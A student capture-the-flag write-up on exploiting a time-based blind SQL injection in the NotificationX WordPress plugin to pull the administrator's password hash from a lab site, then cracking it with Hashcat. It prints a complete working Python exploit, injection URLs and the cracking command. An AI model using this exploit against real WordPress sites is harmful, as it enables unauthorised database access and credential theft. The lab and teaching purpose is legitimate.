# CTF Semana #8 (SQL Injection)

## Context
This week's CTF challenge involves exploiting a SQL injection vulnerability in a WordPress-based website. The objective is to locate vulnerable API endpoints that dynamically interact with the database using user input and leverage these for an SQL injection attack.The vulnerable WordPress site is hosted at `http://44.242.216.18:5008/`. The goal is to retrieve the hashed password of the administrator, which serves as the challenge flag, submitted in the format `flag{<password>}`.

# Task 1: Reconnaissance

Our objective in this task is to gather as much information as we can about what versions are available and what can we exploit. We quickly found the version of the Word Press (version 6.7) and the version of the popup that always shows up, powered by NotificationX (2.8.1) which we can check by inspecting the source code of the page in both cases.

![wpversion](/docs/images/ctf8WPver.png)

![notxver](/docs/images/ctf8notx.png)


We can now explore a bit of the website itself, by exploring a bit we can find a login page (`http://44.242.216.18:5008/admin`brings us there) 

![login](/docs/images/ctf8admin.png)

We can see that the user admin and e mail admin@example.com exists, however it is stated in moodle that even if we find the password, we are not able to log in. 

We also found a page with a search bar (`http://44.242.216.18:5008/404` brings us there) (`/` gives us all the posts in the website)

![404](/docs/images/ctf8404.png)

But we believe the most important at this stage is really the comment on the post "Hello world!" which gives us the information that the admin password's hash starts with `$P$B`.

# Task 2: Finding SQL injection exploits

So, its time to try and find exploits for SQL injection, if we search for worldpress 6.7 sql injection we do find a "WordPress Plugin Email Before Download SQL Injection"(CVE-2021-24748), however we checked and in our website there is no Email before download page, we do not have the requirements needed to do this exploit, we still tried it though with the commands :

`http://44.242.216.18:5008/wp-admin/admin.php?page=email-before-download-links&order=desc&orderby=time_requested+AND+%28SELECT+1554+FROM+%28SELECT%28SLEEP%285%29%29%29gPZH%29`

and 

`http://44.242.216.18:5008/wp-admin/admin.php?page=email-before-download-links&orderby=time_requested&order=+AND+%28SELECT+42+FROM+%28SELECT%28SLEEP%285%29%29%29b%29`

However, as expected this didn't work but it was worth the try. This leaves us with one option, something to do with the notificationX plugin. By searching "notification X sql injection cve" we quickly find a website that identifies the versions that work (NotificationX <= 2.8.2) which checks our box (we have version 2.8.1), surely this has to be it...


# Task 3: Vulnerable Endpoint Identification

The NotificationX plugin for WordPress is vulnerable to SQL Injection via the `'type'` parameter in all versions up to, and including, 2.8.2 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database. This is because a user-supplied parameter is directly used to construct an SQL query, without any sanitization and/or validation.
The vulnerability has a score of 9.8/10 (CRITICAL), which is completely understandable due to its severity. Its time to do our exploit to find the admin's password.

# Task 4: Finding the admin's password

The same website that gave us all the information about the vulnerability also gives us a python exploit to explore that vulnerability:

```python
import requests
import string
from sys import exit

# Sleep time for SQL payloads
delay = 0.3

# URL for the NotificationX Analytics API
url = "http://localhost/wp-json/notificationx/v1/analytics"

admin_password_hash = ""

session = requests.Session()

for idx in range(1, 41):
    # Iterate over all the printable characters + NULL byte
    for ascii_val in (b"\x00"+string.printable.encode()):
        # Send the payload
        resp = session.post(url, data = {
                "nx_id": 1337,
                "type": f"clicks`=IF(ASCII(SUBSTRING((select user_pass from wp_users where id=1),{idx},1))={ascii_val},SLEEP({delay}),null)-- -"
            }
        )

        # Elapsed time > delay if delay happened due to SQLi
        if resp.elapsed.total_seconds() > delay:
            admin_password_hash += chr(ascii_val)
            # Show what we have found so far...
            print(admin_password_hash)
            # Exit condition - encountered a null byte
            if ascii_val == 0:
                print("[*] Admin password hash:", admin_password_hash)
                exit(0)
```

We do need to adapt this to our case though, I knew this exploit would work from the start because when checking the `http://44.242.216.18:5008/wp-json/` page we did found the path of the notificationx that we need: 

![notxpath](/docs/images/ctf8notxpath.png)

This is very important because its the base of our exploit, we adapt the url in our exploit to `"http://44.242.216.18:5008/wp-json/notificationx/v1/analytics"`, but that wasn't enough, the password was returning empty, turns out the delay was too low between sql commands. We tried many different values, 0.8 seems to be the minimum for the exploit to give us output, however it doesn't give us the correct password, so we changed the delay to 5 and that seemed to do the trick. Firstly we were having some consistence problems, it wasn't giving us a password that started with `$P$B`, but after a few tries it started giving us the password correctly consistently, we think this varies from exploit to exploit, we tried a few, but all of them were giving us the correct answer after our initial problems. 
This is our final version of the code: 

```python
# Description: Exploit for the NotificationX plugin SQL injection vulnerability
import requests
import string
from sys import exit

# Sleep time for SQL payloads
delay = 5

# URL for the NotificationX Analytics API
url = "http://44.242.216.18:5008/wp-json/notificationx/v1/analytics"

admin_password_hash = ""

session = requests.Session()

for idx in range(1, 41):
    # Iterate over all the printable characters + NULL byte
    for ascii_val in (b"\x00"+string.printable.encode()):
        # Send the payload
        resp = session.post(url, data = {
                "nx_id": 1337,
                "type": f"clicks`=IF(ASCII(SUBSTRING((select user_pass from wp_users where id=1),{idx},1))={ascii_val},SLEEP({delay}),null)-- -"
            }
        )

        # Elapsed time > delay if delay happened due to SQLi
        if resp.elapsed.total_seconds() > delay:
            admin_password_hash += chr(ascii_val)
            # Show what we have found so far...
            print(admin_password_hash)
            # Exit condition - encountered a null byte
            if ascii_val == 0:
                print("[*] Admin password hash:", admin_password_hash)
                exit(0)

```

and this is the output:

![passoutput](/docs/images/ctf8passoutput.png)


The hash password is `$P$BuRuB0Mi3926H8h.hcA3pSrUPyq0o10` which is a WordPress hashed password using PHPass (Portable PHP password hashing framework).
`$P$` indicates the hash was generated using PHPass. This is commonly used in WordPress for user passwords. 

# Task 5: Get the original password back

We have now the hash password, we need however get it back to its original form. With some reseach we found that we can do this by one of two methods: using Hashcat or using Jonh the Ripper. Considering we were afraid of Jonh, just kidding, we did go with Hashcat, it was easy to install (only one command) and all we needed was to save the hash into a file, we named it "hash.txt". To make it easier to find most common used passwords we also downloaded a file called "rockyou.txt" which was recomended to use to make things easier. (We can find this file by a simple search). To run Hashcat we used the command `hashcat -m 400 hash.txt rockyou.txt` 
which gave us the output `$P$BuRuB0Mi3926H8h.hcA3pSrUPyq0o10:heartbroken` (see printscreen for the complete output)

![hashcat](/docs/images/hashcatoutput.png)


So now we have the original password used: `heartbroken`, just like all of us.

# Task 6: 
Hashing is a one-way process designed to securely store passwords without exposing the plaintext. It enhances security by using techniques like salting (adding randomness) and iterations (repeated hashing) to make brute-force and precomputed attacks (e.g., rainbow tables) more difficult. However, hashes can still be cracked if passwords are weak, or if outdated algorithms like MD5 are used. Tools like Hashcat and John the Ripper can test millions of password guesses efficiently. Modern algorithms like bcrypt or Argon2 offer stronger protection by enforcing high computational costs and unique salts.

To improve security, organizations should: use modern hashing algorithms, Enforce strong password policies and implement rate-limiting and account lockouts to deter brute-force attacks.